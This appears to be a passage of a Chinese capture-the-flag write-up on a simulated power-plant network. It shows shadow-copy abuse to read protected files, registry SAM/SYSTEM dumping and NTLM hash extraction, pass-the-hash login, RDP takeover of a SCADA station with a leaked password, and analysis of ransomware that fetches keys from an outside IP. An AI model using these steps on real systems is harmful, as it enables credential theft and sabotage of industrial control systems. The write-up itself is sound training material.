+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">unix2dos</span> s.dsh<br></code></pre></td></tr></table></figure>
+
+<p>以管理员权限在 PowerShell 中执行命令，执行 diskshadow 并拷贝 flag02 ：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># 某些目录可能会显示当前用户路径权限不够，可以在 C 盘新建目录 Temp</span><br>PS C:<span class="hljs-string">\Users\chenhua\Desktop&gt;</span> cd C:<span class="hljs-string">\</span><br>PS C:<span class="hljs-string">\Users\chenhua\Desktop&gt;</span> mkdir Temp<br>PS C:<span class="hljs-string">\Temp&gt;</span> diskshadow /s s.dsh<br>PS C:<span class="hljs-string">\Temp&gt;</span> dir z:<span class="hljs-string">\Users\Administrator\flag\</span><br>PS C:<span class="hljs-string">\Temp&gt;</span> robocopy /b z:<span class="hljs-string">\Users\Administrator\flag\</span> . flag02.txt<br><br><span class="hljs-comment"># 如果在Downloads目录下，直接运行即可</span><br>diskshadow /s s.dsh<br>robocopy /b z:<span class="hljs-string">\Users\Administrator\flag\</span> . flag02.txt<br>cat flag02.txt<br><br><span class="hljs-comment"># 结果如下</span><br>PS C:<span class="hljs-string">\Users\zhangying\Downloads&gt;</span> diskshadow /s s.dsh<br>Microsoft DiskShadow 版本 <span class="hljs-number">1.0</span><br>版权所有 (C) <span class="hljs-number">2013</span> Microsoft Corporation<br>在计算机上: WIN-ENGINEER，<span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">23</span> <span class="hljs-number">17</span>:<span class="hljs-number">44</span>:<span class="hljs-number">37</span><br>-&gt; set context persistent nowriters<br>-&gt; add volume c: alias mydrive<br>-&gt; create<br>无法将 .cab 元数据文件存储在当前工作目录中，因为它是只读的。<br>请使用 SET METADATA &lt;metadata.cab&gt; 指定现有的可写目录。<br>PS C:<span class="hljs-string">\Users\zhangying\Downloads&gt;</span> robocopy /b z:<span class="hljs-string">\Users\Administrator\flag\</span> . flag02.txt<br>-------------------------------------------------------------------------------<br>   ROBOCOPY     ::     Windows 的可靠文件复制<br>-------------------------------------------------------------------------------<br>  开始时间: <span class="hljs-number">2025</span>年<span class="hljs-number">10</span>月<span class="hljs-number">23</span>日 <span class="hljs-number">17</span>:<span class="hljs-number">44</span>:<span class="hljs-number">50</span><br>        源: z:<span class="hljs-string">\Users\Administrator\flag\</span><br>      目标: C:<span class="hljs-string">\Users\zhangying\Downloads\</span><br>      文件: flag02.txt<br>      选项: /DCOPY:DA /COPY:DAT /B /R:<span class="hljs-number">1000000</span> /W:<span class="hljs-number">30</span><br>------------------------------------------------------------------------------<br>                           <span class="hljs-number">1</span>    z:<span class="hljs-string">\Users\Administrator\flag\</span><br><span class="hljs-number">100</span>%        新文件                   <span class="hljs-number">350</span>        flag02.txt<br>------------------------------------------------------------------------------<br>                  总数        复制        跳过       不匹配        失败        其他<br>       目录:         <span class="hljs-number">1</span>         <span class="hljs-number">0</span>         <span class="hljs-number">1</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span><br>       文件:         <span class="hljs-number">1</span>         <span class="hljs-number">1</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span><br>       字节:       <span class="hljs-number">350</span>       <span class="hljs-number">350</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span><br>       时间:   <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>                       <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>   已结束: <span class="hljs-number">2025</span>年<span class="hljs-number">10</span>月<span class="hljs-number">23</span>日 <span class="hljs-number">17</span>:<span class="hljs-number">44</span>:<span class="hljs-number">50</span><br>PS C:<span class="hljs-string">\Users\zhangying\Downloads&gt;</span> dir<br>    目录: C:<span class="hljs-string">\Users\zhangying\Downloads</span><br>Mode                 LastWriteTime         Length Name<br>----                 -------------         ------ ----<br>-a----        <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">23</span>     <span class="hljs-number">17</span>:<span class="hljs-number">21</span>             <span class="hljs-number">91</span> <span class="hljs-number">1.txt</span><br>-a----        <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">23</span>     <span class="hljs-number">17</span>:<span class="hljs-number">28</span>           <span class="hljs-number">3073</span> EnableSeBackupPrivilege.ps1<br>-a----        <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">23</span>     <span class="hljs-number">14</span>:<span class="hljs-number">19</span>            <span class="hljs-number">350</span> flag02.txt<br>-a----        <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">23</span>     <span class="hljs-number">17</span>:<span class="hljs-number">12</span>         <span class="hljs-number">138798</span> out.txt<br>-a----        <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">23</span>     <span class="hljs-number">17</span>:<span class="hljs-number">43</span>             <span class="hljs-number">90</span> s.dsh<br>-a----         <span class="hljs-number">2025</span>/<span class="hljs-number">9</span>/<span class="hljs-number">14</span>      <span class="hljs-number">1</span>:<span class="hljs-number">10</span>       <span class="hljs-number">10166272</span> winPEASx64.exe<br>PS C:<span class="hljs-string">\Users\zhangying\Downloads&gt;</span> cat flag02.txt<br>  _____.__                 _______   ________<br>_/ ____<span class="hljs-string">\</span>  | _____     ____ <span class="hljs-string">\</span>   _  <span class="hljs-string">\</span>  <span class="hljs-string">\_____</span>  <span class="hljs-string">\</span><br><span class="hljs-string">\</span>   __<span class="hljs-string">\|</span>  | <span class="hljs-string">\__</span>  <span class="hljs-string">\</span>   / ___<span class="hljs-string">\/</span>  <span class="hljs-regexp">/_\  \  /</span>  ____/<br> |  |  |  |__/ __ <span class="hljs-string">\_/</span> <span class="hljs-regexp">/_/</span>  &gt;  <span class="hljs-string">\_/</span>   <span class="hljs-string">\/</span>       <span class="hljs-string">\</span><br> |__|  |____(____  <span class="hljs-regexp">/\___  /</span> <span class="hljs-string">\_____</span>  /<span class="hljs-string">\_______</span> <span class="hljs-string">\</span><br>                 <span class="hljs-string">\//_____/</span>        <span class="hljs-string">\/</span>         <span class="hljs-string">\/</span><br>flag02: flag&#123;de946b53-<span class="hljs-number">3ba</span>4-<span class="hljs-number">4fd</span>0-b80f-aafc911ca447&#125;<br>PS C:<span class="hljs-string">\Users\zhangying\Downloads&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以创建txt来运行，比如script.txt</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> context <span class="hljs-comment">persistent nowriters</span><br>add <span class="hljs-comment">volume c: alias mydrive</span><br>create<br>expose <span class="hljs-comment">%mydrive% z:</span><br></code></pre></td></tr></table></figure>
+
+<p>也是在有权限的位置（无权限自己在C盘下创建一个目录）运行<code>diskshadow /s script.txt</code>，随后可以在z盘备份盘列出administrator用户的目录</p>
+<h3 id="注册表-SAM-转储"><a href="#注册表-SAM-转储" class="headerlink" title="注册表 SAM 转储"></a>注册表 SAM 转储</h3><p>重置环境，尝试直接转储 sam 和 system，发现不需要特权即可以成功导出：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">PS C:\Users\chenhua\Desktop&gt; <span class="hljs-keyword">cd</span> C:\<br>PS C:\Users\chenhua\Desktop&gt; <span class="hljs-keyword">mkdir</span> <span class="hljs-keyword">matrix</span><br>PS C:\Users\chenhua\Desktop&gt; <span class="hljs-keyword">cd</span> C:\<span class="hljs-keyword">matrix</span><br>PS C:\<span class="hljs-keyword">matrix</span>&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\sam c:\<span class="hljs-keyword">matrix</span>\sam<br>PS C:\<span class="hljs-keyword">matrix</span>&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\system c:\<span class="hljs-keyword">matrix</span>\system<br></code></pre></td></tr></table></figure>
+
+<p>下载到本地，提取 Administrator 的 NTLM hash：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs elixir">impacket-secretsdump -sam sam -system system <span class="hljs-title class_">LOCAL</span><br><br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">13.0</span>.dev0 - <span class="hljs-title class_">Copyright</span> <span class="hljs-title class_">Fortra</span>, <span class="hljs-title class_">LLC</span> <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x6c2be46aaccdf65a9b7be2941d6e7759</span><br>[*] <span class="hljs-title class_">Dumping</span> local <span class="hljs-title class_">SAM</span> hashes (<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f82292b7ac79b05d5b0e3d302bd0d279</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">WDAGUtilityAccount:</span><span class="hljs-number">504</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:a2fa2853651307ab9936cc95c0e0acf5</span>:::<br><span class="hljs-symbol">chentao:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">47466010</span>c82da0b75328192959da3658:::<br><span class="hljs-symbol">zhaoli:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>b83822caab67ef07b614d05fd72e215:::<br><span class="hljs-symbol">wangning:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span>c52d89c176321511ec686d6c05770e3:::<br><span class="hljs-symbol">zhangling:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">8349</span>a4c5dd1bdcbc5a14333dd13d9f81:::<br><span class="hljs-symbol">zhangying:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">8497</span>fa5480a163cb7817f23a8525be7d:::<br><span class="hljs-symbol">lilong:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:c3612c48cf829d1149f7a4e3ef4acb8a</span>:::<br><span class="hljs-symbol">liyumei:</span><span class="hljs-number">1006</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">63</span>ddcde0fa219c75e48e2cba6ea8c471:::<br><span class="hljs-symbol">wangzhiqiang:</span><span class="hljs-number">1007</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>a661f54da156dc93a5b546ea143ea07:::<br><span class="hljs-symbol">zhouyong:</span><span class="hljs-number">1008</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>d49bf647380720b9f6a15dbc3ffe432:::<br><span class="hljs-symbol">chenhua:</span><span class="hljs-number">1009</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span>ff24422b538b97f3c297cc8ddc7615:::<br>[*] <span class="hljs-title class_">Cleaning</span> up... <br></code></pre></td></tr></table></figure>
+
+<p>以管理员权限登录获得 flag02：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">proxychains impacket-wmiexec administrator<span class="hljs-variable">@172</span>.<span class="hljs-number">22.17</span>.<span class="hljs-number">6</span> -hashes <span class="hljs-symbol">:f82292b7ac79b05d5b0e3d302bd0d279</span> -codec gbk<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><blockquote>
+<p>尝试接管 SCADA 工程师站，并启动锅炉。</p>
+</blockquote>
+<h2 id="工控系统接管"><a href="#工控系统接管" class="headerlink" title="工控系统接管"></a>工控系统接管</h2><p>之前泄露的信息中已经包含了管理员账号密码：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WIN</span>-SCADA: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.xx<br><span class="hljs-attribute">Username</span>: Administrator<br><span class="hljs-attribute">Password</span>: IYnT3GyCiy3<br></code></pre></td></tr></table></figure>
+
+<p>rdp 登录，当前账号为管理员权限，点击开关，得到 flag：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains xfreerdp3 /u:Administrator /p:IYnT3GyCiy3 /v:172.22.26.11 /cert:ignore<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215557.png" srcset="/img/loading.gif" lazyload alt="image-20251023181448521"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;bcd080d5-<span class="hljs-number">2</span>cf1-<span class="hljs-number">4095</span>-ac15-fa4befca1c0&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><blockquote>
+<p>尝试获取 SCADA 工程师站中的数据库备份，并分析备份文件是否泄漏了敏感数据。</p>
+</blockquote>
+<p>有时候xfreerdp不能从远程主机剪切，可以用这个命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfreerdp3 /u:USERNAME /p:PASSWORD /v:IP /clipboard<br></code></pre></td></tr></table></figure>
+
+<p>这里复制不了远程主机文件，直接用共享文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># xfreerdp3 /u:USERNAME /p:PASSWORD /v:远程主机IP /drive:share,本地路径</span><br>proxychains xfreerdp3 /u:Administrator /p:IYnT3GyCiy3 /v:172.22.26.11 /cert:ignore /drive:share,/home/matrix/Desktop/14ThermalPower/<br></code></pre></td></tr></table></figure>
+
+<p>Win+D 或者 Win+M 回到桌面，发现勒索者留下的信息：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">** </span>您的文件已被加密 **<br><br>很抱歉，您的计算机中的文件已被加密。要解锁您的文件，您需要支付赎金。<br><br><span class="hljs-code">-----------------------------------------</span><br><span class="hljs-code">| 注意事项                               |</span><br><span class="hljs-code">-----------------------------------------</span><br>| 1. 不要试图删除或修改加密文件。        |<br>| 2. 支付赎金前，不要尝试恢复文件。      |<br><span class="hljs-section">| 3. 请在规定时间内支付赎金。            |</span><br><span class="hljs-section">-----------------------------------------</span><br><br>要获取解密密钥和进一步的说明，请访问我们的支付网站：<br><span class="hljs-meta">[支付网站链接]</span><br><br>如果无法访问支付网站，请通过电子邮件联系我们：<br>contact@ransomware.com<br><br>赎金金额：2比特币<br><br><span class="hljs-code">-----------------------------------------</span><br><span class="hljs-code">| 警告：尝试恢复文件或报警将导致永久丢失文件。|</span><br><span class="hljs-code">-----------------------------------------</span><br><br>比特币支付地址：1ABcDefGhijxLxnxpxrsxUvwxYZabcdEf<br></code></pre></td></tr></table></figure>
+
+<p>最近使用的文件中发现 <code>ScadaDB.sql</code>，但是为 0 字节：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215496.png" srcset="/img/loading.gif" lazyload alt="20240313104425-9a950fb6-e0e3-1"></p>
+<p>因为该文件已经被加密为 <code>ScadaDB.sql.locky</code>：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215215.png" srcset="/img/loading.gif" lazyload alt="20240313104430-9e02a302-e0e3-1"></p>
+<p>在 C 盘下找到勒索程序 <code>Lockyou.exe</code> </p>
+<h2 id="勒索程序逆向"><a href="#勒索程序逆向" class="headerlink" title="勒索程序逆向"></a>勒索程序逆向</h2><p>将加密的文件 <code>ScadaDB.sql.locky</code> 和勒索程序 <code>Lockyou.exe</code> 下载到本地进行分析。<code>Lockyou.exe</code> 为 .NET 编译，需要使用<a target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy"> dnSpy</a> 或者 <a target="_blank" rel="noopener" href="https://www.jetbrains.com/zh-cn/decompiler/">dotPeek</a> 进行反编译</p>
+<p>通过 dotPeek 反编译 <code>Lockyou.exe</code>。在源代码中可以看到，RSA 解密得到 <code>AES_KEY</code>。</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> AESCrypto()<br>&#123;<br>  <span class="hljs-keyword">this</span>.BACKEND_URL = <span class="hljs-string">&quot;http://39.101.170.47/&quot;</span>;<br>  <span class="hljs-keyword">this</span>.PRIVATE_KEY = <span class="hljs-keyword">this</span>.GetHttpContent(<span class="hljs-keyword">this</span>.BACKEND_URL + <span class="hljs-string">&quot;privateKey&quot;</span>);<br>  <span class="hljs-keyword">this</span>.AES_KEY_ENC = <span class="hljs-keyword">this</span>.GetHttpContent(<span class="hljs-keyword">this</span>.BACKEND_URL + <span class="hljs-string">&quot;encryptedAesKey&quot;</span>);<br>  <span class="hljs-keyword">this</span>.AES_KEY = <span class="hljs-keyword">this</span>.DecryptRSA(<span class="hljs-keyword">this</span>.AES_KEY_ENC, <span class="hljs-keyword">this</span>.PRIVATE_KEY);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215858.png" srcset="/img/loading.gif" lazyload alt="image-20251023210000415"></p>
+<p>提示中给了两个附件，分别看一下内容：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">encryptedAesKey</span> <span class="hljs-comment"># AES_KEY_ENC</span><br>privateKey  <span class="hljs-comment"># PRIVATE_KEY</span><br></code></pre></td></tr></table></figure>
+
+<p><code>encryptedAesKey</code> 即为 <code>AES_KEY_ENC</code>，是 Base64 字符串：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lFmBs4qEhrqJJDIZ6PXvOyckwF<span class="hljs-regexp">/sqPUXzMM/</span>IzLM<span class="hljs-regexp">/MHu9UhAB3rW/</span>XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=<br></code></pre></td></tr></table></figure>
+
+<p><code>privateKey</code> 即为 <code>PRIVATE_KEY</code>，是 XML 格式文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">RSAKeyValue</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Modulus</span>&gt;</span>uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=<span class="hljs-tag">&lt;/<span class="hljs-name">Modulus</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Exponent</span>&gt;</span>AQAB<span class="hljs-tag">&lt;/<span class="hljs-name">Exponent</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">P</span>&gt;</span>2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==<span class="hljs-tag">&lt;/<span class="hljs-name">P</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Q</span>&gt;</span>2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==<span class="hljs-tag">&lt;/<span class="hljs-name">Q</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">DP</span>&gt;</span>ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==<span class="hljs-tag">&lt;/<span class="hljs-name">DP</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">DQ</span>&gt;</span>PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==<span class="hljs-tag">&lt;/<span class="hljs-name">DQ</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">InverseQ</span>&gt;</span>JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==<span class="hljs-tag">&lt;/<span class="hljs-name">InverseQ</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">D</span>&gt;</span>tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=<span class="hljs-tag">&lt;/<span class="hljs-name">D</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">RSAKeyValue</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>根据 locky 勒索软件家族加解密逻辑和 .NET 逆向代码，解密思路如下：</p>
+<ul>
+<li>首先用 <code>privateKey</code> 对加密的 <code>encryptedAesKey</code>进行 RSA 解密，得到 <code>AES_KEY</code>。</li>
+<li>再用 <code>AES_KEY</code> 对加密的文件 <code>ScadaDB.sql.locky</code> 解密，得到 <code>ScadaDB.sql</code>。</li>
+</ul>
+<h2 id="勒索文件解密"><a href="#勒索文件解密" class="headerlink" title="勒索文件解密"></a>勒索文件解密</h2><p><strong>RSA解密</strong></p>
+<p>通过<a target="_blank" rel="noopener" href="https://www.ssleye.com/ssltool/pem_xml.html">工具</a>，将 <code>privateKey</code> 从 XML 格式转换为 PEM 格式，得到 <code>PRIVATE_KEY</code>：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix">-----BEGIN PRIVATE KEY-----<br>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2<span class="hljs-operator">+</span><br>PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3<br>YiM0p5p4VJn2Y2K7IWUixptX08HEay<span class="hljs-operator">+</span>mGFbH1WRv<span class="hljs-operator">+</span>FC0g1EXwIocjdRyCz<span class="hljs-symbol">/1qgqr</span><br>rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17<br><span class="hljs-number">8</span>A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox<br>RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w<span class="hljs-symbol">/roTW9OK6vlF54o5U/4DnQN</span><br>UM6ss<span class="hljs-symbol">/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz</span><br>J5fbnmZ6PwiyDS<span class="hljs-symbol">/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ</span><br>vjS8xnU8NvxMlk110LSUnfAh<span class="hljs-symbol">/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk</span><br>Vfy5FwJBALpSudaOno1B<span class="hljs-operator">/</span><span class="hljs-number">7</span>XytvNQO04KjU75h<span class="hljs-operator">+</span><span class="hljs-number">31</span>K2tHRUfihwmRZmr<span class="hljs-operator">/</span>Xv52tEP<span class="hljs-symbol">/</span><br>xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0<br>VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd<br>FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy<span class="hljs-symbol">/UUUy</span><br>P<span class="hljs-attr">HvLZB6D8zSyuGw</span><span class="hljs-operator">=</span><br><span class="hljs-operator">-</span>----END PRIVATE 